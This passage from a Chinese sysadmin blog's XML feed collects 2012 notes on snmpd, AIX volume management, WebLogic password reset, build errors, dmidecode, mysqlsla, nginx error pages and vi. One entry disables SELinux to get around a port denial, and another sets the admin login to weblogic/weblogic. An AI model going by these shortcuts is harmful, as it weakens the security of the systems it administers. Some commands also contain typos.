      <title><![CDATA[snmpd服务无法更改默认端口]]></title>
      <url>/2012/08/24/snmp-port-cant.html</url>
      <content type="html"><![CDATA[<h4 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">修改/etc/rc.d/init.d/snmpd的启动脚本</div><div class="line">OPTIONS=&quot;-Lsd -Lf /dev/null -p /var/run/snmpd.pid -a&quot;</div><div class="line">修改为</div><div class="line">OPTIONS=&quot;udp:9999 -Lsd -Lf /dev/null -p /var/run/snmpd.pid -a&quot;</div><div class="line">service snmpd start 时无法启动该服务，终端没有报错提示</div></pre></td></tr></table></figure>
<h4 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">tail -10 /var/log/messages </div><div class="line"></div><div class="line">Aug 24 09:36:24 localhost snmpd[12063]: Error opening specified endpoint &quot;udp:9999&quot;    </div><div class="line">Aug 24 09:36:24 localhost snmpd[12063]: Server Exiting with code 1     </div><div class="line">Aug 24 09:36:24 localhost setroubleshoot: SELinux is preventing the snmpd (snmpd_t) from binding to port 9999\. For complete SELinux messages. run sealert -l ec7e5602-a40f-4831-97d0-ca9e84618549</div><div class="line"></div><div class="line">so,暂且不考虑selinux，命令关掉selinux</div><div class="line"></div><div class="line">setenforce 0</div><div class="line">sestatus </div><div class="line"></div><div class="line">SELinux status: enabled   </div><div class="line">SELinuxfs mount: /selinux    </div><div class="line">Current mode: permissive    </div><div class="line">Mode from config file: disabled    </div><div class="line">Policy version: 21    </div><div class="line">Policy from config file: targeted</div></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> snmpd </tag>
            
            <tag> selinux </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[AIX 学习笔记之 存储管理 LV PV VG PP]]></title>
      <url>/2012/08/19/aix-learning-notes.html</url>
      <content type="html"><![CDATA[<h4 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h4><p>PV 物理卷：普通的直接访问的存储设备，有固定的和可移动的之分，代表性的就是硬盘。<br>vg 卷组：AIX中最大的存储单位，一个卷组由一组物理硬盘组成，也就是由一个或多个物理卷组成。<br>pp 物理分区：是把物理卷划分成连续的大小相等的存储单位，一个卷组中的物理分区大小都相等。<br>lp 逻辑分区：适映射物理分区的逻辑单位，一个逻辑分区可以对应一个也可以对应多个物理分区。<br>lv 逻辑卷：是指卷组中由多个逻辑分区组成的集合，逻辑卷中的逻辑分区是连续的，但是对应的物理分   区是不连续的，可以在一个磁盘上，也可以在不同的磁盘上。<br>fs 文件系统：是指在AIX系统中面向用户的存储空间。一个逻辑卷只能创建一个文件系统，也就是说一个    文件系统对应一个逻辑卷，如果删除逻辑卷也将删除文件系统。</p>
<h4 id="存储结构："><a href="#存储结构：" class="headerlink" title="存储结构："></a>存储结构：</h4><p>逻辑卷lv 不能被直接访问，是生设备（裸设备），逻辑卷上建文件系统，文件系统可以被用户访问，市熟设备。文件系统里建目录，目录下建文件。<br>物理卷，卷组，物理分区，逻辑卷，逻辑分区，逻辑卷是面向操作系统的概念<br>文件系统，目录，文件是面向用户的概念。</p>
<h4 id="LVM的配置数据"><a href="#LVM的配置数据" class="headerlink" title="LVM的配置数据"></a>LVM的配置数据</h4><p>卷组描述区(VGDA):描述卷组中的所有物理卷和逻辑卷的对应关系<br>卷组状态区(VGSA)：记录卷组中物理卷和物理分区的状态信息，在卷组激活时，确定哪些物理分区可用<br>逻辑卷控制块(LVCB)：位于每个逻辑卷开头，包含逻辑卷的信息，占用数百个字节</p>
<p>LVM管理命令就是对VGDA内容的更新，当一块硬盘变成PV时，这个硬盘开始保留一部分空间存放VGDA信息，当把它加入卷组中时，开始将卷组信息写入VGDA区域，当把它从卷组删除时，也同时清除VGDA数据，这个数据还存在于AIX系统的ODM库中，当导入一个卷组时，把VGDA信息写入ODM，导出时删除。</p>
<h4 id="磁盘Quorum"><a href="#磁盘Quorum" class="headerlink" title="磁盘Quorum"></a>磁盘Quorum</h4><p>卷组的每一个物理卷至少包含着一份VGDA和VGSA。当一个卷组只有一块硬盘时，这块硬盘存有两份VGDA和VGSA,当这个卷组由两块硬盘时，其中一块存有两份，另一块存有一份，当卷组由三块以上硬盘时，每块硬盘存有一份。 如果磁盘Quorum存在，则必须保证卷组有51%以上的VGDA/VGSA可以正常访问。淡然也可以关闭磁盘Quorum。</p>
<h4 id="逻辑存储管理的限制"><a href="#逻辑存储管理的限制" class="headerlink" title="逻辑存储管理的限制"></a>逻辑存储管理的限制</h4><p>VG数：每个系统最多255个VG<br>PV数：对于普通卷组，每个VG最多32个PV,对于大VG，每个卷组最多128个PV<br>PP数：每个PV最多有1016个PP<br>LV数：对于普通VG，每个卷组最多255个LV,对于大VG，每个VG最多512个LV<br>LP数：每个LV最多有32512个LP<br>PP和LP的大小：1M到1024M 必须是2的幂次方<br>LP映射PP的数量：一个LP可以映射1-3个PP</p>
<h4 id="物理区域的分布"><a href="#物理区域的分布" class="headerlink" title="物理区域的分布"></a>物理区域的分布</h4><p>外边缘(Outer-Edge)：存放很少访问的数据<br>外中间(Outer-Middle)：创建逻辑卷时默认的位置<br>中间(Center):磁盘搜索时间最短，速度最快。<br>内中间(Inner-Middle)：比中间稍慢一些<br>内边缘(Inner-Edge)存放很少访问的数据</p>
<h4 id="向系统添加一块硬盘"><a href="#向系统添加一块硬盘" class="headerlink" title="向系统添加一块硬盘"></a>向系统添加一块硬盘</h4><p>方法一：<br>添加硬盘后起动机器，自动运行cfgmgr,直接查看结果，如果没有识别再手工配置。</p>
<p>#cfgmgr -v</p>
<p>#lspv</p>
<p>#chdev -l hdisk2 -a pv=yes</p>
<p>方法二：<br>系统不能重起时，县查看原有硬盘，然后安装新硬盘，检查新设备，配置新设备</p>
<p>#lspv</p>
<p>#cfgmgr -v</p>
<p>#lspv</p>
<p>#chdev -l hdisk2 -a pv=yes</p>
<p>#mkdev -c disk -s scsi -t 670mb -p scsi3 -w 6,0 -a pv=yes</p>
<p>#smit makdsk</p>
<h4 id="修改物理卷属性"><a href="#修改物理卷属性" class="headerlink" title="修改物理卷属性"></a>修改物理卷属性</h4><p>#chpv -a n hdisk1    禁止hdisk1在分配新的PP</p>
<p>#chpv -a y hdisk1    允许</p>
<p>#chpv -v r hdisk1    关闭hdisk1的可用性，无法通过逻辑形式读写和访问该物理卷</p>
<p>#chpv -v a hdisk1    允许</p>
<p>#chpv -c hdisk1      清除hdisk1上的引导记录</p>
<p>#smit chpv</p>
<h4 id="显示物理卷信息"><a href="#显示物理卷信息" class="headerlink" title="显示物理卷信息"></a>显示物理卷信息</h4><p>#lsdev -Cc disk 显示系统一定义和已配置的物理卷</p>
<p>#lspv            以不带任何参数的形式显示系统中所有物理卷信息 </p>
<p>#lspv hdisk0     显示一个物理卷hdisk0的属性</p>
<p>#lspv -l hdisk0 显示物理卷hdisk0上分布的逻辑卷。</p>
<p>#lspv -p hdisk0 显示物理卷上每个逻辑卷物理分区的分布情况，同时显示逻辑卷类型和文件mount点。</p>
<p>#lspv -M hdisk0 显示物理分区和逻辑分区的对应情况。</p>
<h4 id="迁移物理卷上的内容："><a href="#迁移物理卷上的内容：" class="headerlink" title="迁移物理卷上的内容："></a>迁移物理卷上的内容：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">a.确定系统中有哪些磁盘可用</div><div class="line">#lsdev -Cc dev</div><div class="line">#lspv</div><div class="line">#extendvg rootvg hdisk5</div><div class="line"></div><div class="line">b.检查卷组中包含哪些磁盘，确认源磁盘和目标磁盘在同一个卷组中，</div><div class="line">#lsvg -p rootvg</div><div class="line"></div><div class="line">c.确定目的盘上有足够的空间存放源盘的内容</div><div class="line">#lspv hdisk0 |grep &quot;USED PPs&quot;</div><div class="line">#lspv hdisk5 |grep &quot;USED PPs&quot;</div><div class="line"></div><div class="line">d.如果是rootvg 上的磁盘，检查引导逻辑卷是否在源磁盘上</div><div class="line">#lspv -l hdisk0 |grep hd5</div><div class="line">#megratepv -l hd5 hdisk0 hdisk5</div><div class="line"></div><div class="line">e.重设系统引导记录</div><div class="line">#bosboot -a -d /dev/hdisk5</div><div class="line">#bosboot -m normal hdisk5</div><div class="line">#mkboot -c -d /dev/hdisk0</div><div class="line"></div><div class="line">f.迁移</div><div class="line">#smit migratevg</div><div class="line">#migratevg hdisk0 hdisk5</div><div class="line">#migratevg -l lv01 hdisk0 hdisk5</div><div class="line"></div><div class="line">g.删除原盘数据</div><div class="line">#reducevg rootvg hdisk0</div><div class="line">#rmdev -dl hdisk0</div></pre></td></tr></table></figure>
<h4 id="卷组管理"><a href="#卷组管理" class="headerlink" title="卷组管理"></a>卷组管理</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">#mkvg -y datavg -d 6 -s 8 hdisk7 hdisk8</div><div class="line">#smit mkvg      创建卷组是保证/etc/vg下有2M空间</div><div class="line">#lsvg           查看系统所有VG</div><div class="line">#lsvg -o        查看激活状态的VG</div><div class="line">#lsvg rootvg    查看rootvg属性</div><div class="line">#lsvg -l rootvg 查看rootvg里的LV</div><div class="line">#lsvg -p rootvg 查看rootvg中包含的物理卷</div><div class="line"></div><div class="line">#chvg -ay datavg 使卷组启动时自动激活</div><div class="line">#chvg -an datavg 使卷组启动时不能自动激活</div><div class="line">#chvg -u datavg 给卷组解锁</div><div class="line"></div><div class="line">#extendvg datavg hdisk5</div><div class="line">#reducevg datavg hdisk5</div><div class="line">#varyonvg datavg</div><div class="line">#varyoffvg datavg</div><div class="line">#exportvg datavg</div><div class="line">#importvg -y datavg hdisk5</div><div class="line">#syncvg -p hdisk03 hdisk05   同步物理卷</div><div class="line">#syncvg -v vg05 vg06         同步卷组vg05和vg06上的拷贝</div><div class="line">#redefinevg -d hdisk0 rootvg   在ODM库中重定义卷组信息，</div><div class="line"></div><div class="line">#swapoff paging_spce_name 使页面空间处于非活动状态</div><div class="line"></div><div class="line">#mirrorvg -c 3 datavg   做3份拷贝的卷组镜像</div><div class="line">#mirrorvg -S -c 3 datavg    后台同步</div><div class="line"></div><div class="line">镜像环境中替换磁盘</div><div class="line">#unmirrorvg datavg hdiak7   删除hdisk7上的镜像</div><div class="line">#reduncevg datavg hdisk7    在卷组中删除hdisk7</div><div class="line">#rmdev -dl hdisk7           在系统中删除hdisk7</div><div class="line"></div><div class="line">#extendvg datavg hdisk7     将新盘加入datavg</div><div class="line">#mirrorvg datavg            给卷组datavg做镜像</div><div class="line">#unmirrorvg                 取消卷组镜像</div></pre></td></tr></table></figure>
<h4 id="逻辑卷管理"><a href="#逻辑卷管理" class="headerlink" title="逻辑卷管理"></a>逻辑卷管理</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">#getlvcb -TA hd2   查看逻辑卷控制块信息</div><div class="line">#lsvg -l rootvg 查看rootvg上的逻辑卷信息</div><div class="line">#lslv mylv        查看一个lv的详细属性</div><div class="line">#lslv -l lv_01   显示一个逻辑卷所跨越的物理卷，以及PP在物理卷上的分布情况</div><div class="line">#lslv -p hdisk1 显示物理卷上的逻辑卷分配图</div></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[WebLogic 11g重置用户密码过程]]></title>
      <url>/2012/08/11/weblogic-11g-reset-password.html</url>
      <content type="html"><![CDATA[<p>刚接手了weblogic环境，对它并不熟悉，又加上之前被辞的人品极为差劲的所谓项目经理没有任何文档，苦不堪言！只好自己寻求解决之道！</p>
<p>首先为了保证数据的安全，要先备份原来的配置文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$DOMAIN_HOME=/wls/Oracle/Middleware/user_projects/domains/base_domain/</div></pre></td></tr></table></figure></p>
<ol>
<li>为了保证操作安全，备份$DOMAIN_HOME/security/DefaultAuthenticatorInit.ldift </li>
<li><p>进入$DOMAIN_HOME/security目录，执行下列命令： </p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">/wls/Oracle/Middleware/user_projects/domains/base_domain/security</div><div class="line">java -classpath /wls/Oracle/Middleware/wlserver_10.3/server/lib/weblogic.jar weblogic.security.utils.AdminAccount weblogic weblogic .</div></pre></td></tr></table></figure>
<p> <code>特别注意命令结尾是空格和一个点号</code><br> 此命令将生成新的DefaultAuthenticatorInit.ldift文件覆盖原来的</p>
</li>
<li><p>进入管理服务器的AdminServer目录，如：$DOMAIN_HOME/servers/AdminServer。将其中的data目录重命名，如：data_old。或者备份到别的地方</p>
</li>
<li>修改管理服务器的boot.properties文件;<br>如：$DOMAIN_HOME/servers/AdminServer/security /boot.properties，修改其中的用户名与密码（用明文，第一次启动服务器时明文将被加密），要和上面命令<br>中的用户名密码一致。<br>例：修改后：<br>username=weblogic<br>password=weblogic</li>
<li>新启动服务器后，就可以使用用户weblogic登录管理控制台了<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">第一次启动后，$DOMAIN_HOME/servers/AdminServer/security/boot.properties中的用户名密码被加密为： </div><div class="line"></div><div class="line">password=&#123;AES&#125;eCAESwlBym9A6ZI6HMOSf1ACl85BwDDouZ2+FaamP1s=    </div><div class="line">username=&#123;AES&#125;YVuNv07/Yi3EjhDUoUjWl/S1jUDamfLpm9/iXAb3gto=</div></pre></td></tr></table></figure>
</li>
</ol>
<p>WebLogic管理控制台访问地址：</p>
<p><a href="http://192.168.1.10:7001/console/login/LoginForm.jsp" title="http://192.168.1.108:7001/console/login/LoginForm.jsp" target="_blank" rel="external">http://192.168.1.10:7001/console/login/LoginForm.jsp</a></p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> java </tag>
            
            <tag> weblogic </tag>
            
            <tag> 中间件 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Cmake编译mysql出错Could NOT find Curses  (missing:  CURSES_LIBRARY CURSES_INCLUDE_PATH)]]></title>
      <url>/2012/08/07/cmake-mysql-error.html</url>
      <content type="html"><![CDATA[<h4 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h4><p>利用Cmake 编译mysql-5.5.8版本时，出现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">-- Could NOT find Curses (missing: CURSES_LIBRARY CURSES_INCLUDE_PATH)   </div><div class="line">CMake Error at cmake/readline.cmake:82 (MESSAGE):    </div><div class="line"> Curses library not found. Please install appropriate package,</div></pre></td></tr></table></figure></p>
<p><a href="http://ow1schdt5.bkt.clouddn.com/old/2012/08/image1.png" target="_blank" rel="external"><img src="http://ow1schdt5.bkt.clouddn.com/old/2012/08/image_thumb1.png" alt="image" title="image"></a></p>
<h4 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h4><p>显示缺少libcurse library,建议安装libncurses5-dev包<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">yum –y install libncures5-*</div><div class="line">如果存在，find / -name libncurses*</div><div class="line">cmake . -DCURSES_LIBRARY=/usr/lib/libncurses.so -DCURSES_INCLUDE_PATH=/usr/include即可解决</div></pre></td></tr></table></figure></p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[在编译subversion-1.7.2出现库文件找不到错误解决]]></title>
      <url>/2012/08/04/subersion172-luuid-not-found.html</url>
      <content type="html"><![CDATA[<h4 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">./configure时没有出现异常警告，当make编译时出现：</div><div class="line">/usr/bin/ld: cannot find -luuid</div><div class="line">collect2: ld returned 1 exit status   </div><div class="line">make: *** [subversion/libsvn_ra_dav/libsvn_ra_dav-1.la] Error 1</div></pre></td></tr></table></figure>
<h4 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ln –s /lib64/libuuid.so.1 /lib/libuuid.so.1 </div><div class="line">ln -s /lib64/libuuid.so.1 /lib/libuuid.so</div></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[linux 查看内存插槽数、最大容量和频率]]></title>
      <url>/2012/08/02/dmidecode-usage.html</url>
      <content type="html"><![CDATA[<blockquote>
<p>我们通过free命令查看机器空闲内存时，会发现free的值很小。这主要是因为，在linux中有这么一种思想，内存不用白不用，因此它尽可能的cache 和buffer一些数据，下面是查看内存的命令供大家参考</p>
</blockquote>
<p><strong>1.Linux 查看内存的插槽数,已经使用多少插槽.每条内存多大，已使用内存多大</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">dmidecode|grep  -P  -A5  &quot;Memorys+Device&quot;|grep Size|grep -v Range </div><div class="line">Size:2048MB </div><div class="line">Size:2048MB </div><div class="line">Size:NoModuleInstalled </div><div class="line">Size:NoModuleInstalled </div><div class="line">Size:NoModuleInstalled </div><div class="line">Size:NoModuleInstalled </div><div class="line">Size:NoModuleInstalled </div><div class="line">Size:NoModuleInstalled</div></pre></td></tr></table></figure></p>
<p><strong>2.Linux 查看内存支持的最大内存容量</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">dmidecode|grep -P  &apos;Maximums+Capacity&apos;</div><div class="line">MaximumCapacity:64GB</div></pre></td></tr></table></figure></p>
<p><strong>3.Linux 查看内存的频率</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">dmidecode|grep -A16 &quot;MemoryDevice&quot; </div><div class="line">dmidecode|grep -A16 &quot;MemoryDevice&quot;|grep &apos;Speed&apos; </div><div class="line">Speed:667MHz(1.5ns) </div><div class="line">Speed:667MHz(1.5ns) </div><div class="line">Speed:667MHz(1.5ns) </div><div class="line">Speed:667MHz(1.5ns) </div><div class="line">Speed:667MHz(1.5ns) </div><div class="line">Speed:667MHz(1.5ns) </div><div class="line">Speed:667MHz(1.5ns) </div><div class="line">Speed:667MHz(1.5ns)</div></pre></td></tr></table></figure></p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[mysql慢日志分析工具之mysqlsla学习笔记]]></title>
      <url>/2012/07/29/mysql-mysqlsla.html</url>
      <content type="html"><![CDATA[<p>一：安装<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"> shell&gt; wget [http://hackmysql.com/scripts/mysqlsla-2.03.tar.gz](http://hackmysql.com/scripts/mysqlsla-2.03.tar.gz)  </div><div class="line"> shell&gt; tar zvxf mysqlsla-2.03.tar.gz  </div><div class="line"> shell&gt; cd mysqlsla-2.03  </div><div class="line"> shell&gt; perl Makefile.PL  </div><div class="line"> shell&gt; make  </div><div class="line"> shell&gt; make install </div><div class="line"> shell&gt; mysqlsla /data/mysql/slow.log</div></pre></td></tr></table></figure></p>
<p>mysqlsla会自动判断日志类型，为了方便可以建立一个配置文件“~/.mysqlsla” ,在文件里写上：top=100，这样会打印出前100条结果。</p>
<p>【统计参数说明】<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"> queries total: 总查询次数  </div><div class="line"> unique:去重后的sql数量  </div><div class="line"> sorted by : 输出报表的内容排序 最重大的慢sql统计信息, 包括 平均执行时间, 等待锁时间, 结果行的总数, 扫描的行总数.  </div><div class="line"> Count: sql的执行次数及占总的slow log数量的百分比.  </div><div class="line"> Time: 执行时间, 包括总时间, 平均时间, 最小, 最大时间, 时间占到总慢sql时间的百分比.  </div><div class="line"> 95% of Time: 去除最快和最慢的sql, 覆盖率占95%的sql的执行时间.  </div><div class="line"> Lock Time: 等待锁的时间.  </div><div class="line"> 95% of Lock: 95%的慢sql等待锁时间.  </div><div class="line"> Rows sent: 结果行统计数量, 包括平均, 最小, 最大数量.  </div><div class="line"> Rows examined: 扫描的行数量.  </div><div class="line"> Database: 属于哪个数据库. </div><div class="line"> Users: 哪个用户,IP, 占到所有用户执行的sql百分比. </div><div class="line"> Query abstract: 抽象后的sql语句. </div><div class="line"> Query sample: sql语句.</div></pre></td></tr></table></figure></p>
<p>二：日志分析<br>常用参数说明：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">-log-type (-lt) type logs:</div><div class="line"> 通过这个参数来制定log的类型，主要有slow, general, binary, msl, udl,分析slow log时通过制定为slow.</div><div class="line">-sort:</div><div class="line"> 制定使用什么参数来对分析结果进行排序，默认是按照t_sum来进行排序。</div><div class="line"> t_sum按总时间排序， c_sum按总次数排序</div><div class="line">-top:显示sql的数量，默认是10,表示取按规则排序的前多少条</div><div class="line">–statement-filter (-sf) [+-][TYPE]:</div><div class="line"> 过滤sql语句的类型，比如select、update、drop.</div><div class="line"> [TYPE]有SELECT, CREATE, DROP, UPDATE, INSERT，例如&quot;+SELECT,INSERT&quot;，不出现的默认是-，即不包括。</div><div class="line">db：要处理哪个库的日志：</div><div class="line">基本用法：</div><div class="line">shell&gt; mysqlsla -lt slow slow.log -sf &quot;+select&quot; -db web -top 100 -sort t_su</div><div class="line"> Count : 2.92k (17.43%) //出现的次数和占所有慢查的比例（按排序规则算） Connection ID : 424 Database : db //哪个数据库的SQL Users : [cacti@localhost](mailto:cacti@localhost) : 100.00% (2920) of query, 57.46% (9625) of all users //哪个用户产生的SQL EXPLAIN : Not a SELECT statement //如果启用-ex，会产生EXPLAIN。 Query abstract: INSERT INTO table(local_data_id, rrd_name, time, output) VALUES (N, &apos;S&apos;, &apos;S&apos;, &apos;S&apos;) Query sample: insert into table(local_data_id, rrd_name, time, output) values (8, &apos;users&apos;, &apos;2009-12-10 10:30:01&apos;, &apos;1&apos;)</div></pre></td></tr></table></figure></p>
<p>注意事项：</p>
<ol>
<li>安装工具后，若运行时出现如下提示：# mysqlsla -lt slow slow.log Can’t locate DBI.pm in @INC (@INC contains: /usr/lib/perl5/site_perl/5.8.8/i386-linux-thread-multi /usr/lib/perl5/site_perl/5.8.8 /usr/lib/perl5/site_perl /usr/lib/perl5/vendor_perl/5.8.8/i386-linux-thread-multi /usr/lib/perl5/vendor_perl/5.8.8 /usr/lib/perl5/vendor_perl /usr/lib/perl5/5.8.8/i386-linux-thread-multi /usr/lib/perl5/5.8.8 .) at /usr/local/bin/mysqlsla line 2095.BEGIN failed–compilation aborted at /usr/local/bin/mysqlsla line 2095.原因:在于相关模块没有安装解决办法：shell&gt; perl -MCPAN -e ‘install DBI’ </li>
<li>相关错误信息解决方案可以查看：<a href="http://www.517sou.net/Article/mysqlsla.aspx" target="_blank" rel="external">http://www.517sou.net/Article/mysqlsla.aspx</a></li>
</ol>
]]></content>
      
        <categories>
            
            <category> MySQL数据库 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[nginx自定义错误页面（补充）]]></title>
      <url>/2012/07/26/nginx-error-custom.html</url>
      <content type="html"><![CDATA[<p>自定义nginx 404错误页面是提高用户体验的一个细节，如果是正规站，我们就必须做好它。你可以对每个网站的错误页面分别设置，也可以设置一个全局的404页面。</p>
<p>为指定位置设定一个404页面</p>
<p>location /my_blog {<br>    error_page    404 = /article_not_found.html;<br>}<br>整个网站的404页面</p>
<p>server {<br>listen 80;<br>    error_page  404  /page_not_found.html;<br>    …<br>你可以用单个错误页面一起来处理多个错误代码</p>
<p>location /my_blog {<br> error_page 500 502 503 504 = /server_error.html<br>}<br>重定向到一个完全不同的服务器，假设你在http区域定义有一个上游服务器server2：</p>
<p>upstream server2 {<br>    server 10.0.0.1:80;<br>}<br>server {<br>    location /my_blog {<br>       error_page    404 = @try_server2;<br>    }<br>    location @try_server2 {<br>        proxy_pass <a href="http://server2" target="_blank" rel="external">http://server2</a>;<br>    }<br>这个功能可以用在Nginx前端+Apache后端的服务器架构中。</p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[vi编辑替换字符笔记]]></title>
      <url>/2012/07/13/vi-manual.html</url>
      <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div></pre></td><td class="code"><pre><div class="line">vi/vim 中可以使用 :s 命令来替换字符串。</div><div class="line"></div><div class="line">　　:s/vivian/sky/ 替换当前行第一个 vivian 为 sky</div><div class="line"></div><div class="line">　　:s/vivian/sky/g 替换当前行所有 vivian 为 sky</div><div class="line"></div><div class="line">　　:n,$s/vivian/sky/ 替换第 n 行开始到最后一行中每一行的第一个 vivian 为 sky</div><div class="line"></div><div class="line">　　:n,$s/vivian/sky/g 替换第 n 行开始到最后一行中每一行所有 vivian 为 sky</div><div class="line"></div><div class="line">　　n 